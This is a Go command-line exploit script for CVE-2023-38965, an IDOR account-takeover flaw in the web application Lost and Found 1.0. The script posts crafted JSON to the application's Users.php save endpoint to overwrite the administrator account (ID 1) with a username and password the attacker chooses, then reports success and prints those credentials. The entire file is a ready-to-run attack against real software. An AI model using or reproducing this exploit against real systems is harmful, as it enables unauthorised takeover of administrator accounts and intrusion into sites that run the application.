package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/akamensky/argparse"
)

type User struct {
	ID         string `json:"id"`
	FirstName  string `json:"firstname"`
	MiddleName string `json:"middlename"`
	LastName   string `json:"lastname"`
	Username   string `json:"username"`
	Password   string `json:"password"`
}

type ExploitConfig struct {
	URL      string
	Username string
	Password string
}

func sendExploitRequest(config ExploitConfig) (string, error) {
	user := User{
		ID:         "1",
		FirstName:  "or4ng",
		MiddleName: "",
		LastName:   "Admin",
		Username:   config.Username,
		Password:   config.Password,
	}

	postBody, err := json.Marshal(user)
	if err != nil {
		return "", fmt.Errorf("failed to marshal user data: %w", err)
	}

	responseBody := bytes.NewBuffer(postBody)

	resp, err := http.Post(config.URL, "application/json", responseBody)
	if err != nil {
		return "", fmt.Errorf("HTTP request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response body: %w", err)
	}

	return string(body), nil
}

func runExploit(config ExploitConfig) {
	response, err := sendExploitRequest(config)
	if err != nil {
		log.Fatalf("An error occurred: %v", err)
	}

	if response == "1" {
		fmt.Println("Exploit successful!")
		time.Sleep(600 * time.Second)
		fmt.Printf("User: %s\nPassword: %s\n", config.Username, config.Password)
	} else {
		fmt.Println("Exploit failed.")
	}
}

func main() {
	fmt.Println("//////////////////////////chaossec/////////////////////////////////////")

	parser := argparse.NewParser("cve-2023-38965", "Exploits an IDOR takeover in Lost and Found 1.0")
	url := parser.String("u", "url", &argparse.Options{Required: true, Help: "URL of the target"})
	username := parser.String("n", "username", &argparse.Options{Required: true, Help: "Username"})
	password := parser.String("p", "password", &argparse.Options{Required: true, Help: "Password"})

	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(1)
	}

	exploitURL := *url + "/classes/Users.php?f=save"
	config := ExploitConfig{
		URL:      exploitURL,
		Username: *username,
		Password: *password,
	}

	runExploit(config)
}
